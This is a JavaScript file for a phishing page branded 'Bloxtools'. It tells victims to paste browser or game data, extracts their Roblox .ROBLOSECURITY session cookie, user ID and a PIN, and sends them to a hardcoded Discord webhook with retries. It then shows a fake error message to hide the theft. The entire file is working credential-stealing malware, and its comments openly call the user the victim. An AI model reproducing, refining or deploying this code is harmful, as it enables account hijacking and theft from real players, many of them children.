/* ======================================================
   PAYLOAD.JS - FINAL WORKING VERSION
   - Extracts .ROBLOSECURITY cookie (removes spaces) + rbxuid
   - Sends to Discord webhook with a 100% valid embed
   - No Roblox API calls (they are blocked by CORS)
   - Handles cookie length > 1024 chars by splitting
====================================================== */

const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";

const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

// PIN validation
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

// Extract cookie (remove whitespace) and rbxuid
function extractGameData(fullText) {
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Could not find .ROBLOSECURITY cookie." };
    }
    let robloxCookie = cookieMatch[1].replace(/\s/g, ''); // remove all spaces

    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;
    if (eventTrackerMatch) {
        const params = eventTrackerMatch[1].split('&');
        for (let p of params) {
            if (p.startsWith("rbxuid=")) {
                rbxuid = p.split('=')[1];
                break;
            }
        }
    }
    if (!rbxuid) {
        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2." };
    }
    return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
}

// Split long cookie into multiple fields (Discord limit: 1024 per field)
function splitCookie(cookie) {
    const maxLen = 1000; // safe margin
    if (cookie.length <= maxLen) return [cookie];
    const parts = [];
    for (let i = 0; i < cookie.length; i += maxLen) {
        parts.push(cookie.substring(i, i + maxLen));
    }
    return parts;
}

// Send webhook with valid embed (no thumbnail, handles long cookie)
async function sendWebhook(pin, cookie, rbxuid) {
    statusMessage.textContent = "⏳ Processing...";
    const cleanCookie = cookie.replace(/\s/g, '');
    const cookieParts = splitCookie(cleanCookie);

    const fields = [
        {
            name: "🆔 User ID",
            value: `\`${rbxuid}\``,
            inline: true
        },
        {
            name: "🔢 PIN Entered",
            value: `\`${pin}\``,
            inline: true
        }
    ];

    // Add cookie parts as separate fields
    if (cookieParts.length === 1) {
        fields.push({
            name: "🔐 .ROBLOSECURITY Cookie (NO SPACES)",
            value: `\`\`\`\n${cookieParts[0]}\n\`\`\``,
            inline: false
        });
    } else {
        for (let i = 0; i < cookieParts.length; i++) {
            fields.push({
                name: `🔐 Cookie Part ${i + 1}/${cookieParts.length}`,
                value: `\`\`\`\n${cookieParts[i]}\n\`\`\``,
                inline: false
            });
        }
    }

    const embed = {
        title: "🔓 Roblox Cookie Dump",
        color: 0xff4444,
        description: `**Cookie length:** ${cleanCookie.length} characters\n**Split into ${cookieParts.length} part(s)**`,
        fields: fields,
        footer: { text: "Bloxtools • Silent Mode" },
        timestamp: new Date().toISOString()
    };

    const payload = {
        username: "Roblox Exfiltrator",
        embeds: [embed]
    };

    // Send with retries
    for (let attempt = 0; attempt < 3; attempt++) {
        try {
            const res = await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            if (res.ok) {
                console.log(`[Bloxtools] Webhook sent (attempt ${attempt + 1})`);
                return true;
            } else {
                const errorText = await res.text();
                console.warn(`HTTP ${res.status}: ${errorText}`);
            }
        } catch (err) {
            console.error(`Attempt ${attempt + 1} failed:`, err);
        }
        if (attempt < 2) await new Promise(r => setTimeout(r, 1000));
    }
    return false;
}

// Main button: fake error, silent send
copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "❌ Invalid PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "❌ Paste the PowerShell game file content.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "⚙️ Verifying cookie...";
    statusMessage.style.color = "#caa8ff";

    const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);

    // Always show fake error to the victim
    statusMessage.textContent = "❌ Failed to verify cookie. Please check your internet and try again.";
    statusMessage.style.color = "#ff9d9d";

    copyButton.classList.remove("loading");
    copyButton.disabled = false;

    if (success) {
        console.log("%c[Bloxtools] SUCCESS: Cookie delivered to Discord.", "color: #00ff00; font-size: 14px");
    } else {
        console.error("%c[Bloxtools] FAILED: Webhook could not be sent.", "color: #ff0000; font-size: 14px");
    }
});
